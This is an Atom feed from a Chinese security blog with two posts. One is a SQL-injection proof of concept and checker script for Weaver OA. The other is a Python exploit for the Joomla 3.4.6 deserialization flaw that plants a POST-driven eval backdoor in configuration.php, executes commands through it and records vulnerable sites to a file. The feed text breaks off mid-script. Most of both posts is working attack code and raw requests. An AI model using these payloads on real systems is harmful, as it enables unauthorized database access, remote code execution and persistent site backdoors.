<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Boogle&#39;s Blog</title>
  
  <subtitle>没有网络安全，就没有国家安全</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://zhengbao.wang/"/>
  <updated>2019-10-11T03:57:34.586Z</updated>
  <id>https://zhengbao.wang/</id>
  
  <author>
    <name>boogle</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>泛微OA前台sql注入漏洞检测(ORACLE数据库)</title>
    <link href="https://zhengbao.wang/%E6%B3%9B%E5%BE%AEOA%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-ORACLE%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    <id>https://zhengbao.wang/泛微OA前台sql注入漏洞检测-ORACLE数据库/</id>
    <published>2019-10-11T03:56:55.000Z</published>
    <updated>2019-10-11T03:57:34.586Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>泛微提供了移动办公、微信办公、协同办公(OA)、流程管理、信息门户、知识管理、费控管理等功能，适用于手机和pc端，是当今比较主流的OA系统之一。前段时间刚爆出Beanshell接口任意代码执行<a href="[https://zhengbao.wang/%E6%B3%9B%E5%BE%AEOA%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/](https://zhengbao.wang/泛微OA远程代码执行漏洞利用/">泛微OA远程代码执行漏洞利用</a>),现在又爆出前台sql注入漏洞。</p><h2 id="0x01-漏洞检测"><a href="#0x01-漏洞检测" class="headerlink" title="0x01 漏洞检测"></a>0x01 漏洞检测</h2><p>本次漏洞是由于WorkflowCenterTreeData接口在使用Oracle数据库时，参数过滤不严导致的sql注入漏洞。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&amp;scope=2333</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: zhengbao.wang</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 2236</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0dunion select null,value from v$parameter order by (((1</span><br></pre></td></tr></table></figure><p>存在漏洞测试截图</p><p><img src="https://i.loli.net/2019/10/11/M92y4vrnzIJEGsH.png" alt></p><p>返回空数据，则不存在漏洞</p><p><img src="https://s2.ax1x.com/2019/10/11/uHy6zj.png" alt></p><p>验证脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sql_test</span><span class="params">(target)</span>:</span></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25'</span>,</span><br><span class="line"><span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'</span>,</span><br><span class="line"><span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.9'</span>,</span><br><span class="line"><span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span></span><br><span class="line"> &#125;</span><br><span class="line">url=target+<span class="string">'/mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&amp;scope=2333'</span></span><br><span class="line">payload=<span class="string">"formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0dunion select NULL,value from v$parameter order by (((1"</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">res=requests.post(url=url,data=payload,headers=headers,timeout=<span class="number">10</span>)</span><br><span class="line">res.encoding=res.apparent_encoding</span><br><span class="line"><span class="comment">#print res.text</span></span><br><span class="line"><span class="keyword">if</span> len(res.text) &gt; <span class="number">23</span>:</span><br><span class="line"><span class="keyword">if</span> (<span class="string">'id'</span> <span class="keyword">in</span> res.text) <span class="keyword">and</span> (<span class="string">'wf_'</span> <span class="keyword">in</span> res.text) <span class="keyword">and</span> (<span class="string">'draggable'</span> <span class="keyword">in</span> res.text):</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] '</span>+target+<span class="string">'is vuluable!'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[-] '</span>+url+<span class="string">'is no vulu'</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[!] '</span>+target+<span class="string">' error'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">target= <span class="string">'zhengbao.wang'</span></span><br><span class="line">sql_test(target)</span><br></pre></td></tr></table></figure><h2 id="0x02-参考链接"><a href="#0x02-参考链接" class="headerlink" title="0x02 参考链接"></a>0x02 参考链接</h2><p><a href="https://mp.weixin.qq.com/s/s83vsNyhnbtmDAV3SXwkyg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/s83vsNyhnbtmDAV3SXwkyg</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;泛微提供了移动办公、微信办公、协同办公(OA)、流程管理、信息门户、知识管理、费控管理等功能，适用于
      
    
    </summary>
    
      <category term="web安全" scheme="https://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="sql注入" scheme="https://zhengbao.wang/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>joomla 3.4.6反序列化漏洞利用</title>
    <link href="https://zhengbao.wang/joomla3-4-6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <id>https://zhengbao.wang/joomla3-4-6反序列化漏洞利用/</id>
    <published>2019-10-09T08:58:25.000Z</published>
    <updated>2019-10-09T09:05:16.918Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>joomla!是一套全球知名的内容管理系统，在此之前，joomla曾爆出过严重的反序列化漏洞<code>CVE-2015-8562</code>,当时，在<code>3.4.6</code>之后的版本中被修复。</p><p>Joomla会话作为PHP对象存储在数据库中，并由PHP会话函数处理。这是一个有趣的攻击媒介，因为会话也为未经身份验证的用户存储，因此在那里的对象注入会导致未经身份验证的RCE。此次影响的版本为<code>3.0.0-3.4.6</code></p><h2 id="0x01-漏洞利用"><a href="#0x01-漏洞利用" class="headerlink" title="0x01 漏洞利用"></a>0x01 漏洞利用</h2><p>10月7号，关于joomla 3.4.6的反序列化漏洞poc被公布。</p><p>环境搭建，<code>joomla 3.4.6</code>下载地址<a href="https://downloads.joomla.org/it/cms/joomla3/3-4-6" target="_blank" rel="noopener">https://downloads.joomla.org/it/cms/joomla3/3-4-6</a></p><p>我在原有脚本的基础上修改了一点进行简单利用，原版可参见<a href="https://cn.0day.today/exploit/33327" target="_blank" rel="noopener">https://cn.0day.today/exploit/33327</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">from</span> termcolor <span class="keyword">import</span> colored</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> Queue</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"> </span><br><span class="line">PROXS = &#123;<span class="string">'http'</span>:<span class="string">'127.0.0.1:8080'</span>&#125;</span><br><span class="line">PROXS = &#123;&#125;</span><br><span class="line"> </span><br><span class="line">cmd = <span class="string">'boogle'</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_info</span><span class="params">(str)</span>:</span></span><br><span class="line">        print(colored(<span class="string">"[*] "</span> + str,<span class="string">"cyan"</span>))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_ok</span><span class="params">(str)</span>:</span></span><br><span class="line">        print(colored(<span class="string">"[+] "</span>+ str,<span class="string">"green"</span>))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_error</span><span class="params">(str)</span>:</span></span><br><span class="line">        print(colored(<span class="string">"[-] "</span>+ str,<span class="string">"red"</span>))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_warning</span><span class="params">(str)</span>:</span></span><br><span class="line">        print(colored(<span class="string">"[!!] "</span> + str,<span class="string">"yellow"</span>))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_token</span><span class="params">(url, cook)</span>:</span></span><br><span class="line">        token = <span class="string">''</span></span><br><span class="line">        resp = requests.get(url, cookies=cook, proxies = PROXS)</span><br><span class="line">        html = BeautifulSoup(resp.text,<span class="string">'html.parser'</span>)</span><br><span class="line">        <span class="comment"># csrf token is the last input</span></span><br><span class="line">        <span class="keyword">for</span> v <span class="keyword">in</span> html.find_all(<span class="string">'input'</span>):</span><br><span class="line">                csrf = v</span><br><span class="line">        csrf = csrf.get(<span class="string">'name'</span>)</span><br><span class="line">        <span class="keyword">return</span> csrf</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_error</span><span class="params">(url, cook)</span>:</span></span><br><span class="line">        resp = requests.get(url, cookies = cook, proxies = PROXS)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Failed to decode session object'</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">                <span class="comment">#print(resp.text)</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="comment">#print(resp.text)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_cook</span><span class="params">(url)</span>:</span></span><br><span class="line">        resp = requests.get(url, proxies=PROXS)</span><br><span class="line">        <span class="comment">#print(resp.cookies)</span></span><br><span class="line">        <span class="keyword">return</span> resp.cookies</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_req</span><span class="params">(url , object_payload)</span>:</span></span><br><span class="line">        <span class="comment"># just make a req with object</span></span><br><span class="line">        <span class="comment">#print_info('Getting Session Cookie ..')</span></span><br><span class="line">        cook = get_cook(url)</span><br><span class="line">        <span class="comment">#print_info('Getting CSRF Token ..')</span></span><br><span class="line">        csrf = get_token(url, cook)</span><br><span class="line"> </span><br><span class="line">        user_payload = <span class="string">'\\0\\0\\0'</span> * <span class="number">9</span></span><br><span class="line">        padding = <span class="string">'AAA'</span> <span class="comment"># It will land at this padding</span></span><br><span class="line">        working_test_obj = <span class="string">'s:1:"A":O:18:"PHPObjectInjection":1:&#123;s:6:"inject";s:10:"phpinfo();";&#125;'</span></span><br><span class="line">        clean_object = <span class="string">'A";s:5:"field";s:10:"AAAAABBBBB'</span> <span class="comment"># working good without bad effects</span></span><br><span class="line"> </span><br><span class="line">        inj_object = <span class="string">'";'</span></span><br><span class="line">        inj_object += object_payload</span><br><span class="line">        inj_object += <span class="string">'s:6:"return";s:102:'</span> <span class="comment"># end the object with the 'return' part</span></span><br><span class="line">        password_payload = padding + inj_object</span><br><span class="line"></span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">'username'</span>: user_payload,</span><br><span class="line">            <span class="string">'password'</span>: password_payload,</span><br><span class="line">            <span class="string">'option'</span>:<span class="string">'com_users'</span>,</span><br><span class="line">            <span class="string">'task'</span>:<span class="string">'user.login'</span>,</span><br><span class="line">            csrf :<span class="string">'1'</span></span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">#print_info('Sending request ..')</span></span><br><span class="line">        resp  = requests.post(url, proxies = PROXS, cookies = cook,data=params)</span><br><span class="line">        <span class="keyword">return</span> resp.text</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_backdoor_pay</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="comment"># This payload will backdoor the the configuration .PHP with an eval on POST request </span></span><br><span class="line">        function = <span class="string">'assert'</span></span><br><span class="line">        template = <span class="string">'s:11:"maonnalezzo":O:21:"JDatabaseDriverMysqli":3:&#123;s:4:"\\0\\0\\0a";O:17:"JSimplepieFactory":0:&#123;&#125;s:21:"\\0\\0\\0disconnectHandlers";a:1:&#123;i:0;a:2:&#123;i:0;O:9:"SimplePie":5:&#123;s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:&#123;&#125;s:5:"cache";b:1;s:19:"cache_name_function";s:FUNC_LEN:"FUNC_NAME";s:10:"javascript";i:9999;s:8:"feed_url";s:LENGTH:"PAYLOAD";&#125;i:1;s:4:"init";&#125;&#125;s:13:"\\0\\0\\0connection";i:1;&#125;'</span></span><br><span class="line"></span><br><span class="line">        payload =  <span class="string">'file_put_contents(\'configuration.php\',\'if(isset($_POST[\\\''</span> + cmd +<span class="string">'\\\'])) eval($_POST[\\\''</span>+cmd+<span class="string">'\\\']);\', FILE_APPEND) || $a=\'http://xxx\';'</span></span><br><span class="line">        <span class="comment">#print(payload)</span></span><br><span class="line">        function_len = len(function)</span><br><span class="line">        final = template.replace(<span class="string">'PAYLOAD'</span>,payload).replace(<span class="string">'LENGTH'</span>, str(len(payload))).replace(<span class="string">'FUNC_NAME'</span>, function).replace(<span class="string">'FUNC_LEN'</span>, str(len(function)))</span><br><span class="line">        <span class="keyword">return</span> final</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ping_backdoor</span><span class="params">(url,param_name)</span>:</span></span><br><span class="line">        res = requests.post(url + <span class="string">'/configuration.php'</span>, data=&#123;param_name:<span class="string">'echo \'PWNED\';'</span>&#125;, proxies = PROXS)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'PWNED'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_backdoor</span><span class="params">(url, payload_code)</span>:</span></span><br><span class="line">        <span class="comment"># Execute PHP code from the backdoor</span></span><br><span class="line">        res = requests.post(url + <span class="string">'/configuration.php'</span>, data=&#123;cmd:payload_code&#125;, proxies = PROXS)</span><br><span class="line">        print(res.text)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(url)</span>:</span></span><br><span class="line"></span><br><span class="line">        target_url = url + <span class="string">'/index.php/component/users'</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            make_req(target_url, get_backdoor_pay())</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print_warning(<span class="string">'exploit error,no index.php/component/users'</span>)</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> ping_backdoor(url, cmd):</span><br><span class="line">                    print_ok(<span class="string">'Backdoor implanted, eval your code at '</span> + url + <span class="string">'/configuration.php in a POST with '</span> + cmd)</span><br><span class="line">                    file_write(<span class="string">'joomla_vulu_site.txt'</span>,url+<span class="string">"\n"</span>)</span><br><span class="line">                    </span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print_error(url +<span class="string">' 